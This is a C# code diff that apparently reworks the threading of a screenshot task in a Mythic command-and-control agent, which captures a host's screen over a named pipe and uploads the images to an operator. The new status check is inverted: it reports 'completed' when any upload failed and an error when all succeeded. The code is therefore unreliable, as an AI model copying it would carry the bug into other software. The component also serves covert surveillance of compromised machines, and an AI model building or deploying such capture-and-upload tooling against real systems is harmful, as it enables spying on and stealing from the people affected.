@@ -38,6 +38,7 @@ namespace Tasks
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private AutoResetEvent _receiverEvent = new AutoResetEvent(false);
         private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);
+        private AutoResetEvent _pipeConnected = new AutoResetEvent(false);
 
         private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
@@ -46,6 +47,7 @@ namespace Tasks
         private AutoResetEvent _complete = new AutoResetEvent(false);
         private Action<object> _sendAction;
         private Action<object> _putFilesAction;
+        List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();
 
         private bool _completed = false;
 
@@ -67,13 +69,13 @@ namespace Tasks
                         ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                     }
                 }
+                _completed = true;
                 _complete.Set();
             };
             _putFilesAction = (object p) =>
             {
-                List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();
                 WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _cancellationToken.Token.WaitHandle, _complete };
-                while(!_cancellationToken.IsCancellationRequested && !_completed)
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
                     WaitHandle.WaitAny(waiters);
                     if (_putFilesQueue.TryDequeue(out byte[] screen))
@@ -91,8 +93,6 @@ namespace Tasks
                         uploadTask.Start();
                     }
                 }
-                ST.Task.WaitAll(uploadTasks.ToArray());
-                _putFilesEvent.Set();
             };
         }
 
@@ -148,7 +148,7 @@ namespace Tasks
                                     {
                                         count = parameters.Count;
                                     }
-                                    if (parameters.Interval > 0)
+                                    if (parameters.Interval >= 0)
                                     {
                                         interval = parameters.Interval;
                                     }
@@ -171,30 +171,19 @@ namespace Tasks
                                         _senderEvent.Set();
                                         WaitHandle[] waiters = new WaitHandle[]
                                         {
-                                            _receiverEvent,
+                                            _complete,
                                             _cancellationToken.Token.WaitHandle
                                         };
-                                        for(int i = 0; i < count && !_cancellationToken.IsCancellationRequested; i++)
+                                        WaitHandle.WaitAny(waiters);
+                                        ST.Task.WaitAll(uploadTasks.ToArray());
+                                        bool bRet = uploadTasks.Where(t => t.Result == false ).ToArray().Length > 0;
+                                        if (bRet)
                                         {
-                                            WaitHandle.WaitAny(waiters);
-                                            if (_receiverQueue.TryDequeue(out IMythicMessage screenshotData))
-                                            {
-                                                if (screenshotData.GetTypeCode() != MessageType.ScreenshotInformation)
-                                                {
-                                                    throw new Exception("Invalid type received from the named pipe!");
-                                                }
-                                                _putFilesQueue.Enqueue(((ScreenshotInformation)screenshotData).Data);
-                                                _putFilesEvent.Set();
-                                            }
+                                            resp = CreateTaskResponse("", true, "completed");
+                                        } else
+                                        {
+                                            resp = CreateTaskResponse("One or more screenshots failed to upload.", true, "error");
                                         }
-                                        _completed = true;
-                                        _complete.Set();
-                                        WaitHandle.WaitAll(new WaitHandle[]
-                                        {
-                                            _complete,
-                                            _putFilesEvent
-                                        });
-                                        resp = CreateTaskResponse("", true, "completed");
                                     }
                                     else
                                     {
@@ -241,6 +230,7 @@ namespace Tasks
         private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
             System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
+            System.Threading.Tasks.Task.Factory.StartNew(_putFilesAction, null, _cancellationToken.Token);
         }
 
         private void OnAsyncMessageSent(IAsyncResult result)
@@ -284,8 +274,13 @@ namespace Tasks
 
             IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
             //Console.WriteLine("We got a message: {0}", mt.ToString());
-            _receiverQueue.Enqueue(msg);
-            _receiverEvent.Set();
+
+            if (msg.GetTypeCode() != MessageType.ScreenshotInformation)
+            {
+                throw new Exception("Invalid type received from the named pipe!");
+            }
+            _putFilesQueue.Enqueue(((ScreenshotInformation)msg).Data);
+            _putFilesEvent.Set();
         }
     }
 }
